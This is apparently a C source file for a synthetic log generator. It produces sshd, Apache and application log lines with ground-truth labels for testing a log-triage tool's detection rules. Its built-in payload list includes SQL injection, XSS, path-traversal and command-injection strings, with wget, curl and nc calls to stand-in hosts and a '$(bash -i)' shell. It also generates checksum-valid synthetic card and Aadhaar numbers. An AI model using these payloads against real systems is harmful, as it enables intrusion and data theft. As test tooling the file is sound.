/* gen: synthetic log generator with exact ground truth (spec §10.1, plan T6.3).
 *
 *   gen -n 1000000 --seed 1 --truth truth.tsv > big.log
 *   gen -n 100000 --rate 50000 | bin/triage ...       (paced output, lines/s)
 *
 * Mixes four log types (sshd, Apache access, Apache error, application log).
 * A fixed number of lines per category is injected at random positions
 * (sequential sampling without replacement, so the counts are exactly
 * round(n * rate), not just in expectation); every other line is normal
 * traffic that no rule labels. Injected lines are built so the default rules
 * label them with exactly the category written to the ground-truth file:
 *
 *   auth        failed ssh logins, PAM failures, sudo password failures
 *   sec         attack payloads from the payload file inside Apache requests
 *   err         ERROR lines, exceptions, HTTP 500, OOM kills
 *   perf        slow queries, high latencies, resource pressure
 *   pii         e-mail, Luhn-valid card, Verhoeff-valid Aadhaar, PAN, secrets
 *   lookalike   Luhn-failing card and Verhoeff-failing Aadhaar numbers: a
 *               regex matches, the validator rejects, so the truth is "no label"
 *
 * Ground truth (--truth FILE): one TSV row per line: seq, labels (comma list
 * or "-"), kind. Luhn and Verhoeff are implemented here independently of
 * src/validators.c, so the truth does not depend on the code under test.
 * (Real sudo lines carry "PWD=/home/x"; the default rules label that as a secret because
 * PII_SECRET_QS matches "pwd=". That false positive is a finding about the rules, so the
 * generator writes "CWD=" instead and keeps the truth exact.)
 * Source addresses are drawn from the whole IPv4 space, so the correlator
 * (brute force needs 5 failures from one address) stays silent and the truth
 * describes single lines only. The output is a pure function of the options
 * and the seed. */

#include <ctype.h>
#include <errno.h>
#include <inttypes.h>
#include <math.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

/* ---- random numbers: splitmix64-seeded xoshiro256** ------------------------ */
typedef struct { uint64_t s[4]; } Rng;

static uint64_t splitmix(uint64_t *x)
{
    uint64_t z = (*x += 0x9e3779b97f4a7c15ull);
    z = (z ^ (z >> 30)) * 0xbf58476d1ce4e5b9ull;
    z = (z ^ (z >> 27)) * 0x94d049bb133111ebull;
    return z ^ (z >> 31);
}

static void rng_seed(Rng *r, uint64_t seed)
{
    for (int i = 0; i < 4; i++)
        r->s[i] = splitmix(&seed);
}

static uint64_t rotl(uint64_t x, int k) { return (x << k) | (x >> (64 - k)); }

static uint64_t rnd(Rng *r)
{
    uint64_t *s = r->s, res = rotl(s[1] * 5, 7) * 9, t = s[1] << 17;
    s[2] ^= s[0]; s[3] ^= s[1]; s[1] ^= s[2]; s[0] ^= s[3];
    s[2] ^= t; s[3] = rotl(s[3], 45);
    return res;
}

static uint64_t below(Rng *r, uint64_t n)       /* 0 .. n-1 (n > 0); modulo bias is below 2^-40 for n < 2^24 */
{
    return rnd(r) % n;
}

/* ---- checksums (independent of src/validators.c) ----------------------------- */
static int luhn_valid(const char *d, int n)
{
    int sum = 0;
    for (int i = 0; i < n; i++) {
        int x = d[n - 1 - i] - '0';
        if (i & 1) {
            x *= 2;
            if (x > 9)
                x -= 9;
        }
        sum += x;
    }
    return sum % 10 == 0;
}

static const uint8_t VD[10][10] = {
    {0,1,2,3,4,5,6,7,8,9},{1,2,3,4,0,6,7,8,9,5},{2,3,4,0,1,7,8,9,5,6},{3,4,0,1,2,8,9,5,6,7},
    {4,0,1,2,3,9,5,6,7,8},{5,9,8,7,6,0,4,3,2,1},{6,5,9,8,7,1,0,4,3,2},{7,6,5,9,8,2,1,0,4,3},
    {8,7,6,5,9,3,2,1,0,4},{9,8,7,6,5,4,3,2,1,0}};
static const uint8_t VP[8][10] = {
    {0,1,2,3,4,5,6,7,8,9},{1,5,7,6,2,8,3,0,9,4},{5,8,0,3,7,9,6,1,4,2},{8,9,1,6,0,4,3,5,2,7},
    {9,4,5,3,1,2,6,8,7,0},{4,2,8,6,5,7,3,9,0,1},{2,7,9,3,8,0,6,4,1,5},{7,0,4,6,9,1,3,2,5,8}};

static int verhoeff_valid(const char *d, int n)
{
    int c = 0;
    for (int i = 0; i < n; i++)
        c = VD[c][VP[i % 8][d[n - 1 - i] - '0']];
    return c == 0;
}

/* ---- options ------------------------------------------------------------------- */
enum { C_AUTH, C_SEC, C_ERR, C_PERF, C_PII, C_LOOK, C_NORMAL, N_CLASS };
static const char *CLASS_NAME[N_CLASS] = { "auth", "sec", "err", "perf", "pii", "lookalike", "normal" };
static const char *CLASS_LABEL[N_CLASS] = { "AUTH_FAILURE", "SECURITY_THREAT", "ERROR", "PERF_WARNING", "PII", "-", "-" };

typedef struct {
    uint64_t n, seed;
    double   rate[N_CLASS];       /* fraction of lines; C_NORMAL is the rest */
    double   pace;                /* lines per second, 0 = as fast as possible */
    const char *payload_file, *truth_file;
    int      help;
} Opt;

#define MAX_PAYLOADS 4096
static char *payloads[MAX_PAYLOADS];
static int   npayloads;

static const char *DEFAULT_PAYLOADS[] = {
    "1 UNION SELECT username,password FROM users", "1 UNION ALL SELECT NULL,version()", "' OR '1'='1",
    "1 or 1=1", "1;SELECT sleep(5)", "1 AND benchmark(1000000,MD5(1))", "x' UNION SELECT table_name FROM information_schema.tables",
    "<script>alert(1)</script>", "javascript:alert(document.cookie)", "<img src=x onerror=alert(1)>",
    "<body onload=alert(1)>", "../../etc/passwd", "..\\..\\windows\\win.ini", "/etc/shadow",
    "....//....//etc/passwd", ";wget http://evil.example/x.sh", "|| curl http://evil.example/x", "&& nc 10.0.0.1 4444",
    "$(bash -i)", ";cat /etc/passwd",
};

static void load_payloads(const char *file)
{
    if (!file) {
        for (size_t i = 0; i < sizeof DEFAULT_PAYLOADS / sizeof *DEFAULT_PAYLOADS; i++)
            payloads[npayloads++] = strdup(DEFAULT_PAYLOADS[i]);
        return;
    }
    FILE *f = fopen(file, "r");
    if (!f) {
        fprintf(stderr, "gen: %s: %s\n", file, strerror(errno));
        exit(2);
    }
    char line[1024];
    while (npayloads < MAX_PAYLOADS && fgets(line, sizeof line, f)) {
        size_t n = strcspn(line, "\r\n");
        line[n] = 0;
        if (n && line[0] != '#')
            payloads[npayloads++] = strdup(line);
    }
    fclose(f);
    if (!npayloads) {
        fprintf(stderr, "gen: %s: no payloads\n", file);
        exit(2);
    }
}

/* ---- line building ---------------------------------------------------------------- */
typedef struct { char *buf; size_t len; } Out;

static const char *pick(Rng *r, const char *const *list, size_t n) { return list[below(r, n)]; }
#define PICK(r, a) pick((r), (a), sizeof (a) / sizeof *(a))

static const char *MONTH[] = { "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec" };
static const char *WDAY[]  = { "Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun" };
static const char *USERS[] = { "alice", "bob", "carol", "dave", "erin", "frank", "grace", "heidi", "ivan", "judy",
                               "root", "admin", "deploy", "oracle", "test", "ubuntu", "postgres", "git" };
static const char *HOSTS[] = { "srv1", "srv2", "srv3", "web01", "web02", "db01", "app01" };
static const char *PATHS[] = { "/", "/index.html", "/products", "/products/42", "/cart", "/checkout", "/api/v1/items",
                               "/api/v1/users/17", "/static/app.js", "/static/site.css", "/images/logo.png", "/about",
                               "/contact", "/login", "/search", "/healthz" };
static const char *UAS[]   = { "Mozilla/5.0 (X11; Linux x86_64) Firefox/118.0", "Mozilla/5.0 (Windows NT 10.0) Chrome/117.0",
                               "curl/8.4.0", "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Safari/604.1", "python-requests/2.31" };
static const char *SERVICES[] = { "UserService", "OrderService", "CatalogService", "CartService", "SessionManager" };

typedef struct {
    Rng     rng;
    int64_t t;                 /* log time, epoch seconds */
    int     ms;                /* millisecond part */
} Gen;

static void tm_parts(const Gen *g, struct tm *tm)
{
    time_t tt = (time_t)g->t;
    gmtime_r(&tt, tm);
}

static void rand_ip(Gen *g, char *out, size_t n)
{
    snprintf(out, n, "%u.%u.%u.%u", 11 + (unsigned)below(&g->rng, 213), (unsigned)below(&g->rng, 256),
             (unsigned)below(&g->rng, 256), 1 + (unsigned)below(&g->rng, 254));
}

static void ts_syslog(const Gen *g, const char *host, const char *proc, int pid, Out *o, const char *msg)
{
    struct tm tm;
    tm_parts(g, &tm);
    o->len += (size_t)snprintf(o->buf + o->len, 2048 - o->len, "%s %2d %02d:%02d:%02d %s %s[%d]: %s",
                               MONTH[tm.tm_mon], tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec, host, proc, pid, msg);
}

static void access_line(Gen *g, Out *o, const char *path_query, int status, const char *ua)
{
    struct tm tm;
    char ip[24];
    tm_parts(g, &tm);
    rand_ip(g, ip, sizeof ip);
    o->len += (size_t)snprintf(o->buf + o->len, 2048 - o->len,
                               "%s - - [%02d/%s/%04d:%02d:%02d:%02d +0000] \"GET %s HTTP/1.1\" %d %u \"-\" \"%s\"", ip,
                               tm.tm_mday, MONTH[tm.tm_mon], tm.tm_year + 1900, tm.tm_hour, tm.tm_min, tm.tm_sec,
                               path_query, status, 200 + (unsigned)below(&g->rng, 90000), ua);
}

static void app_line(Gen *g, Out *o, const char *level, const char *msg)
{
    struct tm tm;
    tm_parts(g, &tm);
    o->len += (size_t)snprintf(o->buf + o->len, 2048 - o->len, "%04d-%02d-%02d %02d:%02d:%02d,%03d %-5s [pool-%u] %s - %s",
                               tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec, g->ms, level,
                               1 + (unsigned)below(&g->rng, 8), PICK(&g->rng, SERVICES), msg);
}

static void apache_error_line(Gen *g, Out *o, const char *module, const char *msg)
{
    struct tm tm;
    tm_parts(g, &tm);
    o->len += (size_t)snprintf(o->buf + o->len, 2048 - o->len, "[%s %s %2d %02d:%02d:%02d.%06u %04d] [%s] [pid %u:tid %u] %s",
                               WDAY[(tm.tm_wday + 6) % 7], MONTH[tm.tm_mon], tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec,
                               g->ms * 1000u, tm.tm_year + 1900, module, 1000 + (unsigned)below(&g->rng, 30000),
                               1000 + (unsigned)below(&g->rng, 60000), msg);
}

/* Percent-encode the characters that make URLs awkward, as web servers log
 * them; spaces become '+' or %20. Half the payloads are left raw. */
static void url_encode(Rng *r, const char *in, char *out, size_t n)
{
    int enc = (int)below(r, 2);
    size_t j = 0;
    for (; *in && j + 4 < n; in++) {
        unsigned char c = (unsigned char)*in;
        if (c == ' ') {
            if (enc && below(r, 2))
                j += (size_t)snprintf(out + j, n - j, "%%20");
            else
                out[j++] = '+';
        } else if (enc && (c == '<' || c == '>' || c == '\'' || c == '"' || c == '(' || c == ')' || c == ';' || c == '\\')) {
            j += (size_t)snprintf(out + j, n - j, "%%%02X", c);
        } else {
            out[j++] = (char)c;
        }
    }
    out[j] = 0;
}

static void digits(Rng *r, char *out, int n)
{
    for (int i = 0; i < n; i++)
        out[i] = (char)('0' + below(r, 10));
    out[n] = 0;
}

/* 16-digit card number; valid = passes Luhn. */
static void card_number(Rng *r, char *out, int valid)
{
    static const char *const prefix[] = { "4", "51", "52", "53", "37", "6011" };
    do {
        const char *p = PICK(r, prefix);
        size_t pl = strlen(p);
        memcpy(out, p, pl);
        digits(r, out + pl, 15 - (int)pl);
        /* last digit: choose the one that makes it valid, or one that does not */
        int want = valid;
        int found = 0;
        for (int d = 0; d < 10 && !found; d++) {
            out[15] = (char)('0' + (d + (int)below(r, 10)) % 10);
            if (luhn_valid(out, 16) == want)
                found = 1;
        }
        if (!found)
            for (int d = 0; d < 10; d++) {
                out[15] = (char)('0' + d);
                if (luhn_valid(out, 16) == want)
                    break;
            }
        out[16] = 0;
    } while (luhn_valid(out, 16) != valid);
}

/* 12-digit Aadhaar-shaped number starting with 2-9; valid = passes Verhoeff. */
static void aadhaar_number(Rng *r, char *out, int valid)
{
    do {
        out[0] = (char)('2' + below(r, 8));
        digits(r, out + 1, 11);
    } while (verhoeff_valid(out, 12) != valid);
}

static void pan_number(Rng *r, char *out)
{
    static const char T[] = "ABCFGHJLPT";
    for (int i = 0; i < 3; i++)
        out[i] = (char)('A' + below(r, 26));
    out[3] = T[below(r, 10)];
    out[4] = (char)('A' + below(r, 26));
    for (int i = 0; i < 4; i++)
        out[5 + i] = (char)('0' + below(r, 10));
    out[9] = (char)('A' + below(r, 26));
    out[10] = 0;
}

static void group4(const char *d16, int mode, char *out)     /* mode 0: plain, 1: spaces, 2: hyphens */
{
    char sep = mode == 1 ? ' ' : '-';
    size_t j = 0;
    for (int i = 0; i < 16; i++) {
        if (mode && i && i % 4 == 0)
            out[j++] = sep;
        out[j++] = d16[i];
    }
    out[j] = 0;
}

/* One normal (unlabelled) line of a random type. */
static const char *normal_line(Gen *g, Out *o)
{
    char ip[24], tmp[256];
    rand_ip(g, ip, sizeof ip);
    switch (below(&g->rng, 4)) {
    case 0: {
        const char *u = PICK(&g->rng, USERS);
        unsigned port = 1024 + (unsigned)below(&g->rng, 60000);
        switch (below(&g->rng, 4)) {
        case 0: snprintf(tmp, sizeof tmp, "Accepted publickey for %s from %s port %u ssh2: RSA SHA256:abc", u, ip, port); break;
        case 1: snprintf(tmp, sizeof tmp, "Connection closed by %s port %u [preauth]", ip, port); break;
        case 2: snprintf(tmp, sizeof tmp, "Received disconnect from %s port %u:11: disconnected by user", ip, port); break;
        default: snprintf(tmp, sizeof tmp, "pam_unix(sshd:session): session opened for user %s by (uid=0)", u); break;
        }
        ts_syslog(g, PICK(&g->rng, HOSTS), "sshd", 1000 + (int)below(&g->rng, 30000), o, tmp);
        return "normal_sshd";
    }
    case 1: {
        static const int ok[] = { 200, 200, 200, 200, 301, 304, 404 };
        snprintf(tmp, sizeof tmp, "%s%s%u", PICK(&g->rng, PATHS), below(&g->rng, 2) ? "?page=" : "?id=", (unsigned)below(&g->rng, 5000));
        access_line(g, o, tmp, ok[below(&g->rng, 7)], PICK(&g->rng, UAS));
        return "normal_access";
    }
    case 2: {
        static const char *const msgs[] = {
            "AH00094: Command line: '/usr/sbin/apache2'", "AH00163: Apache/2.4.52 (Ubuntu) configured -- resuming normal operations",
            "AH00558: Could not reliably determine the server's fully qualified domain name",
            "AH00489: Apache/2.4.52 (Ubuntu) configured", "AH01232: graceful restart requested, doing restart" };
        static const char *const mods[] = { "core:notice", "mpm_event:notice", "ssl:warn", "mpm_event:info" };
        apache_error_line(g, o, PICK(&g->rng, mods), PICK(&g->rng, msgs));
        return "normal_error";
    }
    default: {
        switch (below(&g->rng, 5)) {
        case 0: snprintf(tmp, sizeof tmp, "user %u logged in from %s", (unsigned)below(&g->rng, 90000), ip); break;
        case 1: snprintf(tmp, sizeof tmp, "cache hit for key k%u", (unsigned)below(&g->rng, 100000)); break;
        case 2: snprintf(tmp, sizeof tmp, "request completed in %u ms", 1 + (unsigned)below(&g->rng, 400)); break;
        case 3: snprintf(tmp, sizeof tmp, "order %u shipped to warehouse %u", (unsigned)below(&g->rng, 900000), (unsigned)below(&g->rng, 50)); break;
        default: snprintf(tmp, sizeof tmp, "session %u refreshed", (unsigned)below(&g->rng, 900000)); break;
        }
        app_line(g, o, below(&g->rng, 4) ? "INFO" : "DEBUG", tmp);
        return "normal_app";
    }
    }
}

static const char *auth_line(Gen *g, Out *o)
{
    char ip[24], tmp[320];
    rand_ip(g, ip, sizeof ip);
    const char *u = PICK(&g->rng, USERS);
    unsigned port = 1024 + (unsigned)below(&g->rng, 60000);
    int pid = 1000 + (int)below(&g->rng, 30000);
    const char *host = PICK(&g->rng, HOSTS);
    switch (below(&g->rng, 4)) {
    case 0:
        snprintf(tmp, sizeof tmp, "Failed password for %s from %s port %u ssh2", u, ip, port);
        ts_syslog(g, host, "sshd", pid, o, tmp);
        return "auth_ssh_fail";
    case 1:
        snprintf(tmp, sizeof tmp, "Failed password for invalid user %s%u from %s port %u ssh2", u, (unsigned)below(&g->rng, 100), ip, port);
        ts_syslog(g, host, "sshd", pid, o, tmp);
        return "auth_ssh_invalid_user";
    case 2:
        snprintf(tmp, sizeof tmp, "pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=%s user=%s", ip, u);
        ts_syslog(g, host, "sshd", pid, o, tmp);
        return "auth_pam";
    default:
        snprintf(tmp, sizeof tmp, "%s : %u incorrect password attempts ; TTY=pts/0 ; CWD=/home/%s ; USER=root ; COMMAND=/bin/ls",
                 u, 1 + (unsigned)below(&g->rng, 3), u);
        ts_syslog(g, host, "sudo", 0, o, tmp);
        return "auth_sudo";
    }
}

static const char *sec_line(Gen *g, Out *o)
{
    char enc[512], pq[700];
    if (below(&g->rng, 5) == 0) {                       /* scanner user agent, harmless path */
        static const char *const scan[] = { "sqlmap/1.7.2#stable (https://sqlmap.org)", "Nikto/2.5.0", "Mozilla/5.00 (Nikto/2.1.6)",
                                            "Nmap Scripting Engine", "gobuster/3.6", "masscan/1.3" };
        access_line(g, o, PICK(&g->rng, PATHS), 200, PICK(&g->rng, scan));
        return "sec_scanner";
    }
    url_encode(&g->rng, payloads[below(&g->rng, (uint64_t)npayloads)], enc, sizeof enc);
    snprintf(pq, sizeof pq, "%s?q=%s", PICK(&g->rng, PATHS), enc);
    access_line(g, o, pq, 200, PICK(&g->rng, UAS));
    return "sec_payload";
}

static const char *err_line(Gen *g, Out *o)
{
    char tmp[300];
    switch (below(&g->rng, 4)) {
    case 0:
        snprintf(tmp, sizeof tmp, "unable to process order %u: upstream failure", (unsigned)below(&g->rng, 900000));
        app_line(g, o, "ERROR", tmp);
        return "err_app";
    case 1:
        snprintf(tmp, sizeof tmp, "java.lang.NullPointerException: cannot read field 'id' (request %u)", (unsigned)below(&g->rng, 900000));
        app_line(g, o, "WARN", tmp);
        return "err_exception";
    case 2: {
        static const int st[] = { 500, 502, 503, 504 };
        access_line(g, o, PICK(&g->rng, PATHS), st[below(&g->rng, 4)], PICK(&g->rng, UAS));
        return "err_http5xx";
    }
    default:
        snprintf(tmp, sizeof tmp, "Out of memory: Killed process %u (java) total-vm:%ukB", 1000 + (unsigned)below(&g->rng, 30000),
                 100000 + (unsigned)below(&g->rng, 900000));
        ts_syslog(g, PICK(&g->rng, HOSTS), "kernel", 0, o, tmp);
        return "err_oom";
    }
}

static const char *perf_line(Gen *g, Out *o)
{
    char tmp[300];
    switch (below(&g->rng, 3)) {
    case 0:
        snprintf(tmp, sizeof tmp, "slow query detected, Query_time: %u.%02u rows=%u", 2 + (unsigned)below(&g->rng, 30),
                 (unsigned)below(&g->rng, 100), (unsigned)below(&g->rng, 100000));
        app_line(g, o, "WARN", tmp);
        return "perf_slow_query";
    case 1:
        snprintf(tmp, sizeof tmp, "request took %u ms", 1000 + (unsigned)below(&g->rng, 20000));
        app_line(g, o, "WARN", tmp);
        return "perf_latency";
    default:
        snprintf(tmp, sizeof tmp, below(&g->rng, 2) ? "connection pool exhausted (max=%u)" : "disk usage 9%u%% on /var", (unsigned)below(&g->rng, 10));
        app_line(g, o, "WARN", tmp);
        return "perf_pressure";
    }
}

static const char *pii_line(Gen *g, Out *o)
{
    char tmp[300], num[40], num2[48];
    switch (below(&g->rng, 5)) {
    case 0:
        snprintf(tmp, sizeof tmp, "new signup email=%s%u@example%u.com", PICK(&g->rng, USERS), (unsigned)below(&g->rng, 10000),
                 (unsigned)below(&g->rng, 50));
        app_line(g, o, "INFO", tmp);
        return "pii_email";
    case 1:
        card_number(&g->rng, num, 1);
        group4(num, (int)below(&g->rng, 3), num2);
        snprintf(tmp, sizeof tmp, "payment captured card=%s amount=%u", num2, (unsigned)below(&g->rng, 90000));
        app_line(g, o, "INFO", tmp);
        return "pii_card_valid";
    case 2:
        aadhaar_number(&g->rng, num, 1);
        if (below(&g->rng, 2))
            snprintf(num2, sizeof num2, "%.4s %.4s %.4s", num, num + 4, num + 8);
        else
            snprintf(num2, sizeof num2, "%s", num);
        snprintf(tmp, sizeof tmp, "kyc uid %s verified", num2);
        app_line(g, o, "INFO", tmp);
        return "pii_aadhaar_valid";
    case 3:
        pan_number(&g->rng, num);
        snprintf(tmp, sizeof tmp, "tax record pan %s updated", num);
        app_line(g, o, "INFO", tmp);
        return "pii_pan";
    default:
        snprintf(tmp, sizeof tmp, "callback url /cb?user=%u&password=hunter%u", (unsigned)below(&g->rng, 90000), (unsigned)below(&g->rng, 1000));
        app_line(g, o, "INFO", tmp);
        return "pii_secret";
    }
}

/* Digit strings that look like cards or Aadhaar numbers but fail the checksum.
 * Cards are written without separators: with spaces, the first three groups of
 * a card are themselves a 12-digit Aadhaar-shaped candidate that would pass
 * Verhoeff one time in ten and make the truth ambiguous. */
static const char *lookalike_line(Gen *g, Out *o)
{
    char tmp[300], num[40];
    if (below(&g->rng, 2)) {
        card_number(&g->rng, num, 0);
        snprintf(tmp, sizeof tmp, "payment declined card=%s", num);
        app_line(g, o, "INFO", tmp);
        return "lookalike_card_invalid";
    }
    aadhaar_number(&g->rng, num, 0);
    snprintf(tmp, sizeof tmp, "order id %s shipped", num);
    app_line(g, o, "INFO", tmp);
    return "lookalike_aadhaar_invalid";
}

/* ---- main --------------------------------------------------------------------------- */
static void usage(FILE *f)
{
    fprintf(f,
            "usage: gen [-n LINES] [--seed S] [--rates auth=P,sec=P,err=P,perf=P,pii=P,lookalike=P]\n"
            "           [--payloads FILE] [--truth FILE] [--rate LINES_PER_SECOND]\n"
            "  -n          lines to write (default 100000)\n"
            "  --seed      random seed (default 1); same options + seed = same bytes\n"
            "  --rates     fraction of lines injected per category; categories not named get 0 (defaults when\n"
            "              the option is absent: auth=0.05 sec=0.03 err=0.05 perf=0.03 pii=0.03 lookalike=0.02);\n"
            "              the rest is normal traffic\n"
            "  --payloads  attack payloads, one per line (each must match a SEC rule); default: built in\n"
            "  --truth     write the ground truth (seq, labels, kind) here\n"
            "  --rate      pace the output at this many lines per second (CLOCK_MONOTONIC)\n");
}

static int parse_rates(Opt *o, char *s)
{
    for (char *tok = strtok(s, ","); tok; tok = strtok(NULL, ",")) {
        char *eq = strchr(tok, '=');
        if (!eq)
            return -1;
        *eq = 0;
        int c;
        for (c = 0; c < C_NORMAL; c++)
            if (strcmp(tok, CLASS_NAME[c]) == 0)
                break;
        char *end;
        double v = strtod(eq + 1, &end);
        if (c == C_NORMAL || *end || !(v >= 0) || v > 1)
            return -1;
        o->rate[c] = v;
    }
    return 0;
}

int main(int argc, char **argv)
{
    Opt o = { .n = 100000, .seed = 1 };
    o.rate[C_AUTH] = 0.05; o.rate[C_SEC] = 0.03; o.rate[C_ERR] = 0.05;
    o.rate[C_PERF] = 0.03; o.rate[C_PII] = 0.03; o.rate[C_LOOK] = 0.02;

    for (int i = 1; i < argc; i++) {
        const char *a = argv[i];
        const char *v = i + 1 < argc ? argv[i + 1] : NULL;
        char *end;
        if (!strcmp(a, "-h") || !strcmp(a, "--help")) { o.help = 1; }
        else if (!v) { fprintf(stderr, "gen: %s needs a value\n", a); return 2; }
        else if (!strcmp(a, "-n")) { o.n = strtoull(v, &end, 10); if (*end || !*v) { fprintf(stderr, "gen: bad -n\n"); return 2; } i++; }
        else if (!strcmp(a, "--seed")) { o.seed = strtoull(v, &end, 10); if (*end || !*v) { fprintf(stderr, "gen: bad --seed\n"); return 2; } i++; }
        else if (!strcmp(a, "--rates")) {
            char *copy = strdup(v);
            for (int c = 0; c < C_NORMAL; c++)           /* --rates replaces the defaults */
                o.rate[c] = 0;
            int bad = parse_rates(&o, copy);
            free(copy);
            if (bad) { fprintf(stderr, "gen: bad --rates (use auth=0.05,sec=0.03,...; categories: auth sec err perf pii lookalike)\n"); return 2; }
            i++;
        }
        else if (!strcmp(a, "--payloads")) { o.payload_file = v; i++; }
        else if (!strcmp(a, "--truth")) { o.truth_file = v; i++; }
        else if (!strcmp(a, "--rate")) { o.pace = strtod(v, &end); if (*end || !(o.pace > 0)) { fprintf(stderr, "gen: bad --rate\n"); return 2; } i++; }
        else { fprintf(stderr, "gen: unknown option '%s'\n", a); usage(stderr); return 2; }
    }
    if (o.help) { usage(stdout); return 0; }

    double sum = 0;
    for (int c = 0; c < C_NORMAL; c++)
        sum += o.rate[c];
    if (sum > 1.0) { fprintf(stderr, "gen: rates add up to %.3f > 1\n", sum); return 2; }
    load_payloads(o.payload_file);

    FILE *truth = NULL;
    if (o.truth_file && !(truth = fopen(o.truth_file, "w"))) {
        fprintf(stderr, "gen: %s: %s\n", o.truth_file, strerror(errno));
        return 2;
    }

    /* exact number of injected lines per class; classes are drawn without replacement */
    uint64_t left[N_CLASS], total_left = o.n, injected = 0;
    for (int c = 0; c < C_NORMAL; c++) {
        left[c] = (uint64_t)llround((double)o.n * o.rate[c]);
        injected += left[c];
    }
    if (injected > o.n) { fprintf(stderr, "gen: rates need more lines than -n\n"); return 2; }
    left[C_NORMAL] = o.n - injected;

    Gen g;
    rng_seed(&g.rng, o.seed);
    g.t = 1760000000 + (int64_t)(o.seed % 1000) * 3600;      /* a fixed, seed-dependent start in October 2025 */
    g.ms = 0;

    static char out_buf[1 << 16];
    setvbuf(stdout, out_buf, _IOFBF, sizeof out_buf);
    uint64_t kind_count[N_CLASS] = { 0 };
    struct timespec t0;
    clock_gettime(CLOCK_MONOTONIC, &t0);

    for (uint64_t seq = 0; seq < o.n; seq++) {
        /* pick a class with probability left[c] / total_left */
        uint64_t x = below(&g.rng, total_left), acc = 0;
        int c = 0;
        for (; c < N_CLASS - 1; c++) {
            acc += left[c];
            if (x < acc)
                break;
        }
        left[c]--;
        total_left--;
        kind_count[c]++;

        /* log time advances by 0-19 ms per line */
        int step = (int)below(&g.rng, 20);
        g.ms += step;
        g.t += g.ms / 1000;
        g.ms %= 1000;

        char line[2048];
        Out out = { line, 0 };
        const char *kind;
        switch (c) {
        case C_AUTH: kind = auth_line(&g, &out); break;
        case C_SEC:  kind = sec_line(&g, &out); break;
        case C_ERR:  kind = err_line(&g, &out); break;
        case C_PERF: kind = perf_line(&g, &out); break;
        case C_PII:  kind = pii_line(&g, &out); break;
        case C_LOOK: kind = lookalike_line(&g, &out); break;
        default:     kind = normal_line(&g, &out); break;
        }
        fwrite(line, 1, out.len, stdout);
        fputc('\n', stdout);
        if (truth)
            fprintf(truth, "%" PRIu64 "\t%s\t%s\n", seq, CLASS_LABEL[c], kind);

        if (o.pace > 0) {                                   /* absolute deadlines: no drift */
            fflush(stdout);
            double due = (double)(seq + 1) / o.pace;
            struct timespec d = { t0.tv_sec + (time_t)due, t0.tv_nsec + (long)((due - floor(due)) * 1e9) };
            if (d.tv_nsec >= 1000000000L) { d.tv_sec++; d.tv_nsec -= 1000000000L; }
            while (clock_nanosleep(CLOCK_MONOTONIC, TIMER_ABSTIME, &d, NULL) == EINTR)
                ;
        }
    }
    if (fflush(stdout) != 0) { fprintf(stderr, "gen: write error: %s\n", strerror(errno)); return 1; }
    if (truth && fclose(truth) != 0) { fprintf(stderr, "gen: write error on %s\n", o.truth_file); return 1; }

    fprintf(stderr, "gen: %" PRIu64 " lines, seed %" PRIu64, o.n, o.seed);
    for (int c = 0; c < N_CLASS; c++)
        fprintf(stderr, ", %s %" PRIu64, CLASS_NAME[c], kind_count[c]);
    fputc('\n', stderr);
    return 0;
}
